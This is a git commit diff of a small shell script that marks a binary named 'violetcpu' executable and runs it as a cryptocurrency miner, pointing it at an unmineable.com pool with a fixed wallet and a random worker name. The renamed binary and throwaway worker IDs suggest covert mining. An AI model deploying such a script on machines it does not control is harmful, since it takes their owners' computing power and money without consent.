2bbc9d4af0366d9cf9cc5cb15674199ce881caa5
angkii <83603708+angkii@users.noreply.github.com>
2021-07-21 01:13:59 +0700

    Update xxx.sh

--- xxx.sh
+++ xxx.sh
@@ -1,1 +1,9 @@
-./violetcpu?raw=true -a wrkzcoin -o rx.unmineable.com:3333 -u 0xb13f91835c32249e1506da1201e937d666652725.$(echo $(shuf -i 1000-9999 -n 1)-NICE)
+POOL=rx.unmineable.com:3333
+
+WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
+
+chmod +x violetcpu
+
+./violetcpu --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
